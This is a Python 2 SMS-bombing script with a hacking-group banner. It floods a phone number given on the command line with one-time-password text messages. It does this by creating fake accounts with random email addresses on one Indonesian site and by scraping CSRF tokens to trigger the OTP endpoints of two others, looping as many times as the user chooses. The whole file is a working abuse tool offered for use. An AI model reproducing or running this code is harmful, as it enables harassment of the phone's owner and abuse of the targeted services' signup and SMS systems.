#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
C1 = "\033[1;36m"
G0 = "\033[0;32m"
W0 = "\033[0;37m"
R0 = "\033[0;31m"
import requests,sys,os,random,time
from bs4 import BeautifulSoup as bs
try:
	os.system('cls' if os.name == 'nt' else 'clear')
	print '''%s
   __  ___  __  __  ____  _____  __ __      __ ___  __   __ 
   || ||=|| ||\\\|| ((    ((   )) ||<<      ((  || \/ |  ((   %sCoded by D4RKSH4D0WS%s
|__|| || || || \||  \\\__  \\\_//  || \\\    \_)) ||    | \_))  %sFB gg.gg/AnonRoz-Team
'''%(C1,W0,C1,W0)
	for spam in range(int(sys.argv[2])):
		r=requests.Session()
		gm=''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') for _ in range(10))
		gae=r.post('http://hideandseek.id/account/create',data={'useremail':gm+'@gmail.com','userpassword':'123456','nama':'jnckwoe','userphone':sys.argv[1]}).json()
		if gae['response'] == 'success':
			otp=r.post('http://hideandseek.id/account/send_otp',data={'email':gm+'@gmail.com','phone':sys.argv[1],'send_otp_method':'sms'}).json()
			if otp['response'] == 'success':
				print '%s[ %ssuccess %s] %s'%(W0,G0,W0,sys.argv[1])
			else:
				print '%s[ %sfailed %s] %s'%(W0,R0,W0,sys.argv[1])
		else:
			print '%s[ %sfailed %s] %s'%(W0,R0,W0,sys.argv[1])
		gettoken1=r.get('https://dutarizkia.com/register-perwakilan').text
		token1=bs(gettoken1,'html.parser').findAll('meta')[3]['content']
		duta=r.post('https://dutarizkia.com/register/requestotp',data={'_token':token1,'phone':sys.argv[1],'tipe_user':'perwakilan'}).json()
		if duta['status'] == 'success':
			print '%s[ %ssuccess %s] %s'%(W0,G0,W0,sys.argv[1])
		else:
			print '%s[ %sfailed %s] %s'%(W0,R0,W0,sys.argv[1])
		gettoken2=r.get('http://panel.esaskkp.com/register').text
		token2=bs(gettoken2,'html.parser').findAll('meta')[5]['content']
		kkp=r.post('http://panel.esaskkp.com/send-otp',data={'_token':token2,'nomor_hp':sys.argv[1]}).text
		if kkp == 'true':
			print '%s[ %ssuccess %s] %s'%(W0,G0,W0,sys.argv[1])
		else:
			print '%s[ %sfailed %s] %s'%(W0,R0,W0,sys.argv[1])
		time.sleep(2)
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] Check internet'%(W0,R0,W0))
except IndexError:
	exit('%s[%s!%s] Use : python2 %s 085878732518 10'%(W0,R0,W0,sys.argv[0]))
except IOError:
	exit('%s[%s!%s] File does not exist'%(W0,R0,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] Exit'%(W0,R0,W0))